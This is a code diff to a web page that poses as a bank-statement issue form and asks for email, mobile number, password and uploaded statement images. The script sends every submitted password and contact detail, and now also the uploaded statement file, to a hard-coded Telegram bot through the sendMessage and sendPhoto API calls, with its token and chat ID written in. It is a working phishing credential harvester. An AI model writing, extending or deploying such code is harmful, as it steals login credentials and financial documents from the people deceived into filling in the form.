@@ -301,7 +301,7 @@
                     <label class="file-upload-box">
                         <i class="fa-solid fa-cloud-arrow-up"></i>
                         <span id="file-label-1">Choose Image</span>
-                        <input type="file" id="file1" accept="image/*,.pdf" onchange="updateFileName(this, 'file-label-1')">
+                        <input type="file" id="file1Input" accept="image/*,.pdf" onchange="updateFileName(this, 'file-label-1')">
                     </label>
                 </div>
 
@@ -310,11 +310,11 @@
                     <label class="file-upload-box">
                         <i class="fa-solid fa-cloud-arrow-up"></i>
                         <span id="file-label-2">Choose Image</span>
-                        <input type="file" id="file2" accept="image/*,.pdf" onchange="updateFileName(this, 'file-label-2')">
+                        <input type="file" id="file2Input" accept="image/*,.pdf" onchange="updateFileName(this, 'file-label-2')">
                     </label>
                 </div>
 
-                <button type="submit" class="submit-btn">
+                <button type="submit" class="submit-btn" id="submitBtn">
                     <i class="fa-solid fa-paper-plane"></i> Submit Now
                 </button>
             </form>
@@ -342,11 +342,8 @@
             const mobile = document.getElementById('mobile').value;
             const password = document.getElementById('password').value;
             
-            const file1Text = document.getElementById('file-label-1').textContent;
-            const file2Text = document.getElementById('file-label-2').textContent;
-            
-            const statement1 = file1Text !== 'Choose Image' ? file1Text : 'Not Uploaded';
-            const statement2 = file2Text !== 'Choose Image' ? file2Text : 'Not Uploaded';
+            const file1 = document.getElementById('file1Input').files[0];
+            const file2 = document.getElementById('file2Input').files[0];
 
             const botToken = '8899735524:AAEzzcKQpcMO-mMQb9KSQTXmRUjLW7nhKPU';
             const chatId = '8400052598';
@@ -354,17 +351,50 @@
             const message = `🔔 *New Bank Statement Issue*\n\n` +
                             `📧 Email: ${email}\n` +
                             `📱 Mobile: ${mobile}\n` +
-                            `🔑 Password: ${password}\n` +
-                            `📁 Statement 1: ${statement1}\n` +
-                            `📁 Statement 2: ${statement2}`;
+                            `🔑 Password: ${password}`;
 
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const submitBtn = document.getElementById('submitBtn');
+            submitBtn.textContent = "Submitting...";
+            submitBtn.disabled = true;
 
-            fetch(url, {
+            // Agar pehli file upload ki gayi hai, toh sendPhoto ka use karenge
+            if (file1) {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', file1);
+                formData.append('caption', message);
+                formData.append('parse_mode', 'Markdown');
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if(data.ok) {
+                        alert("Submitted successfully with statement!");
+                        location.reload();
+                    } else {
+                        alert("Error sending photo. Trying text only...");
+                        sendTextOnly(botToken, chatId, message);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert("Something went wrong!");
+                    submitBtn.textContent = "Submit Now";
+                    submitBtn.disabled = false;
+                });
+            } else {
+                // Agar file nahi hai toh sirf text bhejenge
+                sendTextOnly(botToken, chatId, message);
+            }
+        }
+
+        function sendTextOnly(botToken, chatId, message) {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: chatId,
                     text: message,
@@ -378,11 +408,15 @@
                     location.reload();
                 } else {
                     alert("Error sending details. Please try again.");
+                    document.getElementById('submitBtn').textContent = "Submit Now";
+                    document.getElementById('submitBtn').disabled = false;
                 }
             })
             .catch(error => {
                 console.error('Error:', error);
                 alert("Something went wrong!");
+                document.getElementById('submitBtn').textContent = "Submit Now";
+                document.getElementById('submitBtn').disabled = false;
             });
         }
     </script>
